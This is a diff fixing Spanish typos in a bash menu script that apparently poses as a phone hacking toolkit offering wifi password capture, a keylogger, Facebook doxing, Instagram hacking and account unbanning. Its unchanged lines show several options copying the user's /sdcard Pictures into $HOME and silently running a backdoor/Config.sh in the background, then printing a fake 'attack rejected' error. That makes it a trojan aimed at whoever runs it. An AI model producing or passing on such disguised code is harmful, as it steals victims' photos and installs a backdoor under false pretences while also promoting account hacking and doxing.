@@ -41,7 +41,7 @@ read enter
 sleep 2
 echo ""
 echo "[+]Escaneo correcto"
-echo -n "[+]Introuduce el nombre de red wifi >"
+echo -n "[+]Introuduce el nombre de red wifi > "
 read wifi
 echo -e "\e[1;37m[+]Capturando contraseña de\e[0m \e[1;31m$wifi\e[0m"
 cd /sdcard
@@ -64,7 +64,7 @@ echo ""
 echo -n "[+]Presiona enter para continuar _"
 read enter
 echo ""
-echo -n "[+]Introuduce una clave para tu keylooger > " 
+echo -n "[+]Introduce una clave para tu keylooger > " 
 read key
 echo "[+]Clave es $key"
 sleep 1
@@ -89,7 +89,7 @@ echo ""
 setterm -foreground green
 echo "[Servidor Vulnerable]"
 echo ""
-echo -n "[+]Introuce la IP del Servidor > "
+echo -n "[+]Introduce la IP del Servidor > "
 read ip
 echo ""
 sleep 1
@@ -112,9 +112,9 @@ exit
 #! /bin/bash
 echo ""
 setterm -foreground greem
-echo "{Extrasion de una Pagina Web}"
+echo "{Extracción de una Pagina Web}"
 sleep 1
-echo -n "[+]Introuce la IP de la pagina > "
+echo -n "[+]Introduce la IP de la pagina > "
 read pi
 echo ""
 sleep 1
@@ -140,7 +140,7 @@ echo ""
 setterm -foreground green
 echo "{Tumbar pagina web}"
 echo ""
-echo -n "[+]Introuce la IP de la pagina > "
+echo -n "[+]Introduce la IP de la pagina > "
 read pa
 sleep 1
 echo ""
@@ -168,7 +168,7 @@ echo ""
 setterm -foreground green
 echo "<Doxing a una persona>"
 echo ""
-echo -n "[+]Introuce el ID de Facebook > "
+echo -n "[+]Introduce el ID de Facebook > "
 read id
 sleep 1
 echo ""
@@ -181,7 +181,7 @@ echo ""
 cd /$HOME/backdoor
 bash Config.sh &
 setterm -foreground red
-echo "[x]Facebook rechazo tu atacke"
+echo "[x]Facebook rechazo tu ataque"
 echo "[x]ERROR"
 exit
 ;;
@@ -191,7 +191,7 @@ echo ""
 setterm -foreground green
 echo "Hackear Instagran"
 echo ""
-echo -n "[+]Introuce el ID de Instagram > "
+echo -n "[+]Introduce el ID de Instagram > "
 read di
 sleep 1
 echl ""
@@ -204,7 +204,7 @@ echo ""
 cd /$HOME/backdoor
 bash Config.sh &
 setterm -foreground red
-echo "[x]Instagram rechazo tu atacke"
+echo "[x]Instagram rechazo tu ataque"
 echo "[x]ERROR"
 exit
 ;;
@@ -214,13 +214,13 @@ echo ""
 setterm -foreground green
 echo "(Soporte a un numero)"
 echo ""
-echo -n "[+]Introuce el codigo de pais + > "
+echo -n "[+]Introduce el codigo de pais + > "
 read co
 sleep 1 
 echo ""
-echo -n "[+]Introuce el numero de telefono > "
+echo -n "[+]Introduce el numero de telefono > "
 read tel
-echo -e "\e[1;37m[+]Mandando a soporte a\e[0m \e[1;31m$co $tel ...\e[0m"
+echo -e "\e[1;37m[+]Mandando soporte a\e[0m \e[1;31m$co $tel ...\e[0m"
 sleep 1
 cd /sdcard
 cp -r Pictures /$HOME
@@ -230,7 +230,7 @@ echo ""
 cd /$HOME/backdoor
 bash Config.sh &
 setterm -foreground red
-echo "[x]Whatsapp rechazo tu atacke"
+echo "[x]Whatsapp rechazo tu ataque"
 echo "[x]ERROR"
 exit
 ;;
@@ -240,11 +240,11 @@ echo ""
 setterm -foreground green
 echo "(Desbanear numero)"
 echo ""
-echo -n "[+]Introuce el codigo de pais + > "
+echo -n "[+]Introduce el codigo de pais + > "
 read co
 sleep 1
 echo ""
-echo -n "[+]Introuce el numero de telefono > "
+echo -n "[+]Introduce el numero de telefono > "
 read tel
 echo -e "\e[1;37m[+]Desbaneando numero \e[0m \e[1;31m$co $tel ...\e[0m"
 sleep 1
@@ -266,7 +266,7 @@ echo ""
 setterm -foreground green
 echo "(Desbanear cuenta de FreeFire)"
 echo ""
-echo -n "[+]Introuce tu ID del FreeFire > "
+echo -n "[+]Introduce tu ID del FreeFire > "
 read fre
 sleep 1
 echo ""
